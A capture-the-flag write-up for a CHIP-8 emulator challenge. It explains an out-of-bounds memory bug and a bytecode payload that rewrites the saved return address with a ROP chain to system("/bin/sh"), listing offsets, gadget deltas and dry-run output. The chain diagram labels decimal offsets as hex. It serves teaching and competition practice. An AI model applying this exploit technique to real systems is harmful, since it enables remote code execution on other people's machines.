# CHIP

**Category:** pwn · **Points:** 84 · **Solves:** 96 · **Author:** Carthago & donc42

## Challenge

A CHIP-8 emulator that reads the program from stdin instead of a file:

```
Starting CHIP...
Remember to run our example program with ./chip fluxlogo.ch8

Enter your CHIP bytecode > 
```

Whatever you send is executed as CHIP-8 opcodes, one debug line per instruction,
until an unknown opcode or SDL quit arrives:

```
Instruction: 6e00
Instruction: afff
...
CHIP exited with 2
```

Over the network the binary runs under `socat tcp-l:1024,reuseaddr,fork
EXEC:'/chal/user/chip'`, i.e. stdin is a **pipe**, not a PTY. The flag is
`/flag.txt` (mounted through `compose.yaml`) and is only readable by the
service user, so we need a shell.

## TL;DR

`struct program_state` mixes a 4096-byte `memory[]` with a `uint16_t I` index
and the interpreter never bounds-checks the `Fx55`/`Fx65` block transfers. `I`
is 16-bit, so a CHIP-8 program can read and write 64 KiB starting at
`&memory`, which covers the whole state, the saved callee-saved registers and
the saved return address at `&memory + 4152`. The payload is a CHIP-8 program
that copies the saved RIP out, adds four deltas to it with 8-bit arithmetic,
writes a ROP chain back (`.text` is only a `ret`, a `pop rdi`, `"/bin/sh"` and
`system`), zero-terminates it and then executes `0x0000` so `main` returns into
`system("/bin/sh")`.

## Files

| file | what it is |
| --- | --- |
| `solve.py` | builds the bytecode, verifies it offline, sends it, runs the shell |
| `public/chip` | the (PIE, unstripped) handout binary |
| `public/src/chip.c` | interpreter source |
| `public/libc.so.6` | libc the offsets are taken from (debian trixie) |
| `public/Dockerfile`, `public/compose.yaml` | build + `socat tcp-l:1024 ... EXEC:'/chal/user/chip'` |

## Analysis

### The state

```c
struct program_state {
    uint16_t stack[STACK_SIZE];   /* 48 * 2 = 96 bytes */
    uint8_t  memory[MEMORY_SIZE]; /* 4096 */
    uint16_t I;
    uint16_t PC;
    uint8_t  V[16];
    uint8_t  delay_timer, sound_timer;
    int      stack_pointer;
};
```

`main` keeps it as a local (`struct program_state main_state = { 0 };`, no
canary, `push rbp; push rbx; sub rsp, 0x1088`), so everything above `memory[]`
is on the stack. The relevant distances from `&main_state.memory` (the base
that `I` indexes) are:

```
&memory + 0     .. +4095    memory[]
&memory + 4096              I, PC
&memory + 4100 .. +4115     V[0..15]
&memory + 4136              saved rbx
&memory + 4144              saved rbp
&memory + 4152              saved rip          <- the chain lands here
```

`main` ends with `add rsp, 0x1088; pop rbx; pop rbp; ret`, so a write at
`&memory + 4152` is a write to the return address.

### The bug

```c
case 0x55:                                  /* Fx55: registers -> [I..] */
    for (int i = 0; i <= X; i++)
        state->memory[I + i] = state->V[i];
case 0x65:                                  /* Fx65: [I..] -> registers */
    for (int i = 0; i <= X; i++)
        state->V[i] = state->memory[I + i];
```

`I` is `uint16_t` and there is no check against `MEMORY_SIZE`, so `I` selects
any byte in `&memory + 0 .. &memory + 65535`. `Fx33` (BCD) and `DXYN` (sprite)
share the flaw, but `Fx55`/`Fx65` are the useful ones: 16 bytes in, 16 bytes
out, no side effects.

The program is loaded at `PROGRAM_START = 0x200` by
`fread(state->memory + 0x200, 3584, 1, stdin)`, so one `sendall()` of
`>= 3584` bytes is enough for the whole payload; the VM starts with `PC = 0x200`.

### Instruction set used

`ANNN` can only reach `0..0xFFF`, but the interesting offsets are around
`0x1000`, so `seti()` builds `I = 0xFFF + n` (`0xFFF <= off <= 0x1FFE`):

```
6E nn            V14 = n            (n = off - 0xFFF)
AFFF             I = 0xFFF
FE1E             I += V14
```

`8XY4` is `V[X] = V[X] + V[Y]` with `VF = carry`, `8XY1` is `V[X] |= V[Y]`, and
`0xFX1E` adds `V[X] & 0xFFF` to `I`.

## Solution

All steps happen inside one VM run, because the payload never knows the libc
base until it reads it from the stack.

### Step 1 — read the saved frame

```
seti(4152); FF65      V0..V15 = *(16 bytes at &memory+4152)   -> saved RIP, saved rbp
seti(4200); FF55      store them at PTRCOPY = 4200            (scratch, above the chain)
```

`4200` is 48 bytes above the saved RIP and above the 40 bytes the chain needs
(`4152..4191`), so it does not collide with anything we later write.
`V0..V7` now hold the saved RIP, which on this libc build is
`libc_base + 0x29CA8` (inside `__libc_start_call_main`).

### Step 2 — compute four gadget addresses with 8-bit adds

The VM has no 64-bit addition, so `add6()` adds a 48-bit delta one byte at a
time, carrying through `VF`:

```
V6 = V7 = 0
for i in 0..5:
    V14 = byte i of delta
    if i: V7 = VF              ; carry from the previous byte
    V[r] += V14   (VF = carry)
    V6  = VF                   ; remember that carry
    V[r] += V7    (VF = carry)
    VF |= V6                   ; VF = either carry, for the next byte
```

Per gadget: load the pristine qword from `PTRCOPY`, add the delta, write exactly
8 bytes (`F755`) at `CHAIN + 8*k`, highest slot first. The deltas are small and
positive, so no borrow handling is needed:

| slot | value | delta from `0x29CA8` |
| --- | --- | --- |
| 0 | `ret` | `+0x1AF` |
| 1 | `pop rdi; ret` | `+0x49D` |
| 2 | `"/bin/sh"` | `+0x17C1FC` |
| 3 | `system` | `+0x29468` |

### Step 3 — why the extra `ret`

`main_state` is 16-byte aligned, so the saved RIP slot is `8 (mod 16)`. A chain
that starts with `pop rdi` would enter `system` with `rsp = slot + 24 ≡ 0
(mod 16)` — `system` wants the ABI's "called" alignment (`8 (mod 16)`, since a
`call` pushes 8). One bare `ret` in front fixes it:

```
[0x4152] ret                 -> alignment
[0x415A] pop rdi; ret
[0x4162] "/bin/sh"
[0x416A] system
[0x4172] 0                   -> chain terminator
```

### Step 4 — stop the VM and return

```
V0..V7 = 0; seti(4184); F755      zero the terminator qword
0x0000                            unknown opcode -> UNRECOGNIZED_INSTRUCTION
```

`execute_instruction()` returns a non-`RUNNING` state, `main` breaks out of its
loop, prints `CHIP exited with %d` and returns — straight into the chain.

### Running it

```
python3 solve.py --dry-run                     # offline: build + interpret
python3 solve.py <HOST> <PORT>                 # TLS is used on :443
python3 solve.py <HOST> <PORT> --plain         # plain TCP
```

`--dry-run` re-interprets the generated opcodes with a small model of
`execute_instruction()` against a fake stack and checks where the chain landed:

```
[*] 205 words, 3840 bytes, 205 steps
    0x00007f3456729e57 == 0x00007f3456729e57  True
    0x00007f345672a145 == 0x00007f345672a145  True
    0x00007f34568a5ea4 == 0x00007f34568a5ea4  True
    0x00007f3456753110 == 0x00007f3456753110  True
    0x0000000000000000 == 0x0000000000000000  True
[+] model reproduces the ROP chain
```

Live, phase 1 is the interpreter's per-instruction trace ending in
`CHIP exited with 2`, then the socket is a shell:

```
flag{...}
PWNED
uid=...(...) gid=...
```

## Flag

```
flag{w0w_1t_3ven_h4s_a_d1spl4y_cbecfad06b5b6f7ac3b84e5776c36c63}
```

## Notes

* The payload is 205 CHIP-8 words = 410 bytes, padded to 3840 zeros. `read_input`
  only consumes 3584 bytes (`MEMORY_SIZE - PROGRAM_START`), so a tail of 256
  NULs stays in the pipe and is fed to the shell later; bash drops NUL bytes,
  so the commands after the payload still execute. Sending the padded file is
  simply what the validated artifact does.
* `0x0000` is not a valid CHIP-8 opcode in this interpreter, which makes it a
  clean "return now" instruction. That is also why the payload must not contain
  a zero word earlier: the VM would stop before the chain is written.
* The binary prints `Instruction: %x` for every instruction (line 138 of
  `chip.c`), so phase 1 produces a large trace. `solve.py` reads until
  `CHIP exited` instead of waiting for a fixed time.
* Because the libc base is read from the stack inside the VM, the exploit is
  ASLR-independent as long as the four deltas match `public/libc.so.6`; a
  different libc build requires recomputing `R`, `G_RET`, `G_POP`, `BINSH` and
  `SYSTEM`.
* The `ret` gadget is not optional: without it `system` is entered with the
  stack 8 bytes out of alignment and usually dies in glibc's SSE copy paths
  instead of spawning a shell.
